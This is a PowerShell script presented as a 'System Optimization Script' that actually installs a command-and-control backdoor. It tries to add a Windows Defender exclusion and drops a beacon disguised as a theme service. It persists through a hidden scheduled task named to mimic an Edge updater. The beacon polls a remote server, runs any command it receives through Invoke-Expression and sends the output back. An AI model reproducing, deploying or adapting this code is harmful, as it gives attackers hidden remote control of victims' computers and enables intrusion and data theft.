# System Optimization Script - Updated for New Backend
$ErrorActionPreference = 'SilentlyContinue'

# Configuration
$C2_URL = 'https://backend.ice-cold-169.workers.dev'
$VICTIM_ID = -join ((65..90) + (97..122) | Get-Random -Count 12 | ForEach-Object {[char]$_})

# Locations
$InstallDir = "$env:APPDATA\Microsoft\Windows\Themes"
$BeaconPath = "$InstallDir\ThemeService.ps1"
$LogFile = "$env:APPDATA\Microsoft\Windows\theme.log"

"[$(Get-Date)] === Installation Started ===" | Out-File $LogFile

try {
    # Create directory
    if (!(Test-Path $InstallDir)) {
        New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
        "[$(Get-Date)] Created directory: $InstallDir" | Out-File $LogFile -Append
    }
    
    # Try Defender exclusion
    try {
        Add-MpPreference -ExclusionPath $InstallDir -Force
        "[$(Get-Date)] Added Defender exclusion" | Out-File $LogFile -Append
    } catch {
        "[$(Get-Date)] Defender exclusion failed (OK)" | Out-File $LogFile -Append
    }
    
    # Create beacon script (UPDATED FOR NEW BACKEND!)
    $BeaconScript = @"
`$C2_URL = '$C2_URL'
`$VICTIM_ID = '$VICTIM_ID'
`$LogFile = '$LogFile'

while (`$true) {
    try {
        "[`$(Get-Date)] Beaconing..." | Out-File `$LogFile -Append
        
        # NEW BACKEND FORMAT: JSON POST
        `$beaconBody = @{
            id = `$VICTIM_ID
        } | ConvertTo-Json
        
        `$headers = @{
            'Content-Type' = 'application/json'
            'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        }
        
        # Send beacon (POST with JSON)
        `$response = Invoke-RestMethod -Uri "`$C2_URL/beacon" -Method Post -Body `$beaconBody -Headers `$headers -TimeoutSec 30
        
        "[`$(Get-Date)] Beacon response: `$(`$response | ConvertTo-Json -Compress)" | Out-File `$LogFile -Append
        
        # Check if command exists
        if (`$response.command) {
            "[`$(Get-Date)] Executing command: `$(`$response.command)" | Out-File `$LogFile -Append
            
            # Execute command
            `$output = try {
                Invoke-Expression `$response.command 2>&1 | Out-String
            } catch {
                "Error: `$(`$_.Exception.Message)"
            }
            
            "[`$(Get-Date)] Command output length: `$(`$output.Length) chars" | Out-File `$LogFile -Append
            
            # Send result back (JSON POST)
            `$resultBody = @{
                id = `$VICTIM_ID
                commandId = `$response.commandId
                output = `$output
            } | ConvertTo-Json
            
            Invoke-RestMethod -Uri "`$C2_URL/api/result" -Method Post -Body `$resultBody -Headers `$headers -TimeoutSec 30 | Out-Null
            
            "[`$(Get-Date)] Result sent successfully" | Out-File `$LogFile -Append
        } else {
            "[`$(Get-Date)] No command, sleeping..." | Out-File `$LogFile -Append
        }
        
    } catch {
        "[`$(Get-Date)] Error: `$(`$_.Exception.Message)" | Out-File `$LogFile -Append
    }
    
    Start-Sleep 60
}
"@

    # Write beacon script
    Set-Content -Path $BeaconPath -Value $BeaconScript -Force
    "[$(Get-Date)] Beacon script created: $BeaconPath" | Out-File $LogFile -Append
    
    # Create scheduled task
    $TaskName = "MicrosoftEdgeUpdateTaskMachineUA"
    schtasks /delete /tn $TaskName /f 2>$null
    
    $Action = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$BeaconPath`""
    schtasks /create /tn $TaskName /tr "powershell.exe $Action" /sc ONLOGON /ru "$env:USERNAME" /rl HIGHEST /f | Out-Null
    
    "[$(Get-Date)] Scheduled task created: $TaskName" | Out-File $LogFile -Append
    
    # Start beacon NOW
    Start-Process powershell.exe -ArgumentList $Action -WindowStyle Hidden
    "[$(Get-Date)] Beacon started!" | Out-File $LogFile -Append
    
    "[$(Get-Date)] === Installation Complete ===" | Out-File $LogFile -Append
    "[$(Get-Date)] Victim ID: $VICTIM_ID" | Out-File $LogFile -Append
    Write-Host "SUCCESS! Victim ID: $VICTIM_ID"
    Write-Host "Check log: $LogFile"
    
} catch {
    "[$(Get-Date)] FATAL ERROR: $($_.Exception.Message)" | Out-File $LogFile -Append
    Write-Host "ERROR: $($_.Exception.Message)"
}